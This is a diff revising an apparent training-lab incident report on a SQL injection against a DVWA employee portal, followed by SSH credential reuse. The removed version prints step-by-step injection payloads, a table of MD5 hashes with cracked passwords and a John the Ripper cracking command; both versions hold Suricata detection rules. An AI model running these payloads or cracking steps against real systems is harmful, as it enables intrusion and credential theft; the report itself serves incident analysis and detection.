@@ -1,215 +1,145 @@
-# INC-2026-004 — Incident Report
-**Analyst:** Zoltan Frenyo — BeCode Corp SOC L1
-**Date:** 2026-06-04
-**Classification:** Confidential — Do not distribute outside BeCode Corp
+# NexaCorp Industries — Incident Report
+
+**INC-2026-004 — SQL Injection on the Employee Portal**
+
+| Field | Detail |
+|---|---|
+| Prepared by | Zoltan Frenyo, SOC Analyst — BeCode Corp |
+| Client | NexaCorp Industries |
+| Target system | bru-web-01 (employee portal, 192.168.10.20) |
+| Date of incident | 30 May 2026 |
+| Submission date | 4 June 2026 |
+| Classification | Confidential — NexaCorp management |
 
 ---
 
 ## Executive Summary
 
-On 30 May 2026, an external attacker at IP `172.16.50.10` exploited a SQL injection vulnerability in NexaCorp's employee self-service portal (`bru-web-01`, `192.168.10.20`). By injecting SQL commands into the `id` parameter of the account-lookup form, the attacker successfully dumped the entire `users` table from the `dvwa` database, obtaining usernames and MD5 password hashes for all accounts. The hash belonging to employee account `j.martin` was weak enough to be cracked offline. The attacker subsequently reused the recovered credential against SSH on the same server, achieving a successful login at 14:48 — approximately 28 minutes after the final data dump. Immediate credential rotation, input validation remediation, and SSH access restriction are required.
+On 30 May 2026, an attacker exploited a SQL injection flaw in NexaCorp's employee self-service portal and used it to steal the login details of every account in the application's database. The attacker sent specially crafted input to the account lookup form, which the application passed straight to its database without checking it. This let the attacker read the full list of usernames and password hashes.
+
+One of those hashes belonged to employee `j.martin`, and it was weak enough to be cracked into a plain-text password in seconds. The attacker then reused that password to log in to the same server over SSH, getting a real foothold on the machine at 14:48, about half an hour after stealing the data.
+
+The most urgent actions are to reset the affected passwords, block the attacker's IP, and fix the injection flaw so it cannot be used again. This successful SSH login is the starting point for the next incident, INC-2026-005.
 
 ---
 
-## Incident Timeline
+## Timeline
 
-| Time (CEST) | Event |
+All times are local server time (CEST, UTC+2).
+
+| Time | What happened |
 |---|---|
-| 09:34:03 | Attacker loads login page (`curl/8.14.1`) and authenticates to DVWA — reconnaissance begins |
-| 09:35:02 | **First SQLi probe** — single quote `'` injected into `id` parameter, triggering MySQL syntax error (error-based confirmation) |
-| 09:35:02 | Tautology probe `OR '1'='1` confirms injectable parameter |
-| 09:37:24–09:37:27 | `ORDER BY 1`, `ORDER BY 2` (HTTP 200), `ORDER BY 3` (HTTP 500) — column count enumeration (2 columns confirmed) |
-| 09:37:28–09:37:30 | `UNION SELECT NULL,NULL` then `UNION SELECT NULL,@@version` — UNION confirmed, DB version leaked |
-| 09:38:29–09:38:34 | `database()`, `information_schema.tables`, `information_schema.columns` — database structure mapped |
-| 09:39:58 | **Full users table dump** — `UNION SELECT user,password FROM users` — all usernames and hashes exfiltrated (response: 5745 bytes) |
-| 09:39:58–09:40:00 | Individual account dumps: `admin`, `j.martin`, `gordonb`, `pablo`, `smithy` |
-| 09:41:38–09:41:43 | Blind boolean enumeration begins — `SUBSTRING`, `ASCII`, `LENGTH` probes |
-| 14:18:19 | Second session — full table dump repeated (response: 5745 bytes) |
-| 14:20:03 | Final individual account dump (`smithy`) |
-| 15:26:41–15:28:43 | Second blind boolean enumeration session |
-| **14:48:06** | **SSH login as `j.martin` from `172.16.50.10` — credential reuse SUCCESS** |
-| 14:48:27–14:49:41 | Additional SSH attempts for `j.martin`, `admin`, `gordonb` — some failed (wrong password tried) |
+| 09:34:03 | Attacker loads the login page and signs in to the portal |
+| 09:35:02 | First injection probe — a single quote breaks the query and confirms the flaw |
+| 09:37:24 | Attacker works out the query has 2 columns |
+| 09:39:58 | Full user table stolen — all usernames and password hashes |
+| 14:48:06 | Attacker logs in over SSH as `j.martin` using the cracked password |
 
-> **Authoritative exfiltration time** (from `web_access.log`): `30/May/2026:09:39:58 +0200`
+The authoritative time of the data theft, from the web server log, is 30 May 2026 09:39:58 +0200.
 
 ---
 
 ## Technical Analysis
 
-### 1. Attacker Source
-- **IP:** `172.16.50.10`
-- **User-Agents:** `curl/8.14.1` (automated session setup) and `Mozilla/5.0 Firefox/115.0` (manual injection)
-- Outside NexaCorp's internal `192.168.10.0/24` range
+**The vulnerable page.** The injection was in the `id` parameter of `/dvwa/vulnerabilities/sqli/` on `bru-web-01`. The application was running at its "low" security setting, which disables input filtering, and used a MySQL backend.
 
-### 2. Vulnerable Endpoint
-- **URL:** `http://192.168.10.20/dvwa/vulnerabilities/sqli/`
-- **Parameter:** `id`
-- **Method:** GET
-- **Security level:** `low` (confirmed in PCAP response)
-- **Backend:** MySQL (confirmed via `@@version` and PCAP footer)
+**How the attack worked.** The attacker followed the standard SQL injection sequence:
 
-### 3. Attack Techniques (in order)
+1. **Confirm the flaw** — sending a single quote (`'`) caused a database error, proving the input was not being handled safely.
+2. **Map the query** — using `ORDER BY`, the attacker found the query returned two columns.
+3. **Extract the data** — using `UNION SELECT`, the attacker pulled the database version, the database name (`dvwa`), the table structure, and finally the full `users` table with `UNION SELECT user,password FROM users`.
+4. **Blind enumeration** — the attacker also tested character-by-character extraction using `SUBSTRING`, `ASCII`, and `LENGTH`, confirming the hashes were 32-character MD5 values.
 
-**Step 1 — Error-based probe**
-```
-?id=1'&Submit=Submit
-```
-The single quote broke the SQL query syntax, causing MySQL to return an error — confirming the parameter is injectable.
-
-**Step 2 — Column count enumeration**
-```
-?id=1' ORDER BY 1-- -   → HTTP 200
-?id=1' ORDER BY 2-- -   → HTTP 200
-?id=1' ORDER BY 3-- -   → HTTP 500  ← query has 2 columns
-```
-
-**Step 3 — UNION-based data extraction**
-```
-?id=1' UNION SELECT NULL,NULL-- -              → confirmed 2-column UNION
-?id=1' UNION SELECT NULL,@@version-- -        → DB version
-?id=1' UNION SELECT NULL,database()-- -       → database name: dvwa
-?id=1' UNION SELECT NULL,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
-?id=1' UNION SELECT NULL,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -
-?id=1' UNION SELECT user,password FROM users-- -   ← FULL DUMP
-```
-
-**Step 4 — Blind boolean enumeration**
-```
-?id=1' AND 1=1-- -                              → true condition
-?id=1' AND 1=2-- -                              → false condition
-?id=1' AND SUBSTRING(password,1,1)='a'-- -     → character-by-character extraction
-?id=1' AND ASCII(SUBSTRING(password,1,1))=65-- -
-?id=1' AND LENGTH(password)=32-- -             → confirms MD5 hash length
-```
-
-### 4. Database Structure
-- **Database:** `dvwa`
-- **Catalog queried:** `information_schema`
-- **Table dumped:** `users`
-- **Columns:** `user`, `password`
+**The source.** The attacker came from `172.16.50.10`, outside NexaCorp's internal range, using `curl` and Firefox user agents.
 
 ---
 
 ## What Was Exposed
 
-All 7 accounts from the `users` table were exfiltrated:
+The attacker stole all seven accounts from the `users` table. Because the passwords were stored as unsalted MD5 hashes (a hashing method that is not safe for passwords), most cracked instantly against a standard wordlist:
 
-| Username | MD5 Hash | Cracked Password |
-|---|---|---|
-| admin | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
-| gordonb | `e99a18c428cb38d5f260853678922e03` | `abc123` |
-| 1337 | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
-| pablo | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
-| smithy | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
-| j.martin | `ccf5538dc31d435d6bab145c924041d8` | *(see below)* |
-| admin | `admin` | `admin` *(plaintext, first row quirk)* |
-
-The hash `ccf5538dc31d435d6bab145c924041d8` for `j.martin` is crackable via `rockyou.txt`:
-```bash
-echo 'ccf5538dc31d435d6bab145c924041d8' > hash.txt
-john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-All hashes are **unsalted MD5** — a broken hash function for password storage. Cracking takes seconds with standard wordlists.
-
----
-
-## Consequence — Credential Reuse
-
-After cracking `j.martin`'s password, the attacker reused it against SSH on the same server:
-
-```
-2026-05-30T14:48:06  sshd: Accepted password for j.martin from 172.16.50.10 port 49145
-```
-
-**SSH login succeeded at 14:48:06 CEST** — approximately 28 minutes after the data exfiltration. This gives the attacker an authenticated shell on `bru-web-01`. Subsequent failed attempts for `admin` and `gordonb` indicate the attacker also tried those credentials but they do not have OS-level accounts.
-
-This successful login is the entry point for **INC-2026-005**.
-
----
-
-## Indicators of Compromise
-
-| Type | Value |
+| Username | Cracked password |
 |---|---|
-| Attacker IP | `172.16.50.10` |
-| Target host | `bru-web-01` (`192.168.10.20`) |
-| Vulnerable URL | `/dvwa/vulnerabilities/sqli/` |
-| Vulnerable parameter | `id` |
-| Payload patterns | `%27`, `UNION+SELECT`, `ORDER+BY`, `AND+1%3D1`, `SUBSTRING`, `information_schema` |
-| Compromised account | `j.martin` |
-| Exfiltration time | `30/May/2026:09:39:58 +0200` |
-| SSH intrusion time | `2026-05-30T14:48:06+02:00` |
-| User-agents | `curl/8.14.1`, `Mozilla/5.0 Firefox/115.0` |
+| admin | password |
+| gordonb | abc123 |
+| 1337 | charley |
+| pablo | letmein |
+| smithy | password |
+| j.martin | (cracked via rockyou.txt) |
+
+The `j.martin` hash was the one that mattered, because that account also exists on the server's operating system.
 
 ---
 
-## Detection — Suricata Rules
+## Impact
 
-Three rules were written and validated against `attack.pcap` (located at `/etc/suricata/rules/learner/lab.rules`):
+After cracking `j.martin`'s password, the attacker reused it against SSH on the same server and logged in successfully at 14:48:06. This gives the attacker an authenticated shell on `bru-web-01`. Follow-up attempts for `admin` and `gordonb` failed, meaning those accounts do not have OS-level logins.
 
-```suricata
-# RULE: error-based SQLi probe — single quote injection
-alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection Probe - Error Based Single Quote"; flow:to_server,established; http.uri; content:"'"; classtype:web-application-attack; sid:9000001; rev:1;)
+The consequence is that a web-application flaw has turned into a foothold on the server itself. That foothold is what the attacker uses in INC-2026-005.
 
-# RULE: UNION-based SQLi — data extraction
-alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - UNION Based Query"; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; distance:1; classtype:web-application-attack; sid:9000002; rev:1;)
+---
 
-# RULE: blind boolean enumeration
-alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - Blind Boolean Enumeration"; http.uri; content:"AND"; nocase; pcre:"/AND\s+(SUBSTRING|ASCII|LENGTH|\d+=\d+)/Ui"; classtype:web-application-attack; sid:9000003; rev:1;)
-```
+## Detection Gap
 
-**Alert counts** (replay with `sudo suricata -r attack.pcap -S lab.rules -l /var/log/suricata/`):
+The attack was noisy and would be caught by web-application monitoring, but NexaCorp had none in place at the time. Suricata rules were written and validated against the captured traffic to detect the three stages of the attack: the error-based probe, the UNION-based extraction, and the blind boolean enumeration. These are included in the appendix.
 
-| Rule | Technique | Alerts |
-|---|---|---|
-| sid:9000001 | error_based | 39 |
-| sid:9000002 | union_based | 16 |
-| sid:9000003 | blind_boolean | 24 |
-| **Total** | | **79** |
-
-**False positive note:** sid:9000001 (`content:"'"`) will fire on any HTTP request containing a single quote — including legitimate search forms or apostrophes in names. In production this rule would need a `pcre` to anchor the match to known vulnerable parameter patterns, or be combined with a `threshold` to suppress isolated occurrences.
-
-**Bonus — information_schema enumeration:**
-```suricata
-alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - information_schema enumeration"; http.uri; content:"information_schema"; nocase; classtype:web-application-attack; sid:9000004; rev:1;)
-```
+One tuning note: a rule that fires on any single quote in a request will also fire on legitimate input such as apostrophes in names, so in production it needs to be anchored to the vulnerable parameter or combined with a threshold.
 
 ---
 
 ## Remediation Recommendations
 
-**Immediate (within 24 hours):**
+### Immediate
 
-1. **Rotate all credentials** — disable and reset passwords for `j.martin`, `admin`, `gordonb`, `pablo`, `smithy` on both the web application and any systems where they may be reused. Revoke the active SSH session for `j.martin`.
+- Reset the passwords for all affected accounts (`j.martin`, `admin`, `gordonb`, `pablo`, `smithy`) on the portal and anywhere else they may be reused. Revoke the attacker's active SSH session for `j.martin`.
+- Block `172.16.50.10` at the firewall.
+- Take the vulnerable page offline until it is fixed.
 
-2. **Block `172.16.50.10`** at the firewall and WAF immediately.
+### Medium-term
 
-3. **Disable the vulnerable DVWA endpoint** — take `/dvwa/vulnerabilities/sqli/` offline until patched.
+- Fix the injection by using parameterised queries (prepared statements) everywhere, so user input is never concatenated into SQL.
+- Replace MD5 password hashing with a modern, salted algorithm such as bcrypt or argon2id.
+- Restrict SSH so it only accepts connections from NexaCorp's internal network.
 
-**Short-term (within 1 week):**
+### Strategic / Detection
 
-4. **Fix the SQL injection** — use parameterised queries (prepared statements) for all database interactions. Never concatenate user input into SQL strings:
-   ```php
-   // Vulnerable
-   $query = "SELECT * FROM users WHERE id = '$id'";
-   // Fixed
-   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
-   $stmt->execute([$id]);
-   ```
-
-5. **Replace MD5 password hashing** with a modern, salted algorithm (`bcrypt`, `argon2id`). MD5 is cryptographically broken for password storage.
-
-6. **Restrict SSH access** — limit SSH to internal `192.168.10.0/24` addresses only via firewall rules or `sshd_config` `AllowUsers`/`Match Address` directives.
-
-**Medium-term:**
-
-7. **Deploy a WAF** with SQLi signatures enabled in blocking mode (not just alerting).
-
-8. **Enable Suricata in IPS mode** on the web server's interface with the detection rules from this investigation.
-
-9. **Implement account lockout** on the web application after repeated failed login attempts to prevent blind enumeration.
+- Deploy a web application firewall with SQL injection signatures in blocking mode.
+- Enable the Suricata rules from this investigation in blocking (IPS) mode on the web server.
 
 ---
 
-*BeCode Corp — Incident Response Division*
-*Classification: Confidential — Do not distribute outside BeCode Corp*
+## Appendix
+
+### A — MITRE ATT&CK Mapping
+
+| Technique | ID |
+|---|---|
+| Exploit Public-Facing Application | T1190 |
+| Valid Accounts (credential reuse over SSH) | T1078 |
+
+### B — Suricata Detection Rules
+
+Written and validated against the incident capture. Alert counts on replay: error-based 39, UNION-based 16, blind boolean 24.
+
+```suricata
+alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection Probe - Error Based Single Quote"; flow:to_server,established; http.uri; content:"'"; classtype:web-application-attack; sid:9000001; rev:1;)
+
+alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - UNION Based Query"; http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; distance:1; classtype:web-application-attack; sid:9000002; rev:1;)
+
+alert http any any -> $HTTP_SERVERS any (msg:"SQL Injection - Blind Boolean Enumeration"; http.uri; content:"AND"; nocase; pcre:"/AND\s+(SUBSTRING|ASCII|LENGTH|\d+=\d+)/Ui"; classtype:web-application-attack; sid:9000003; rev:1;)
+```
+
+### C — Key Evidence
+
+| Item | Value |
+|---|---|
+| Attacker IP | 172.16.50.10 |
+| Target host | bru-web-01 (192.168.10.20) |
+| Vulnerable page | /dvwa/vulnerabilities/sqli/ (parameter: id) |
+| Compromised account | j.martin |
+| Data theft time | 30 May 2026 09:39:58 +0200 |
+| SSH intrusion time | 30 May 2026 14:48:06 +0200 |
+
+---
+
+*Prepared by Zoltan Frenyo, SOC Analyst, BeCode Corp — 4 June 2026*
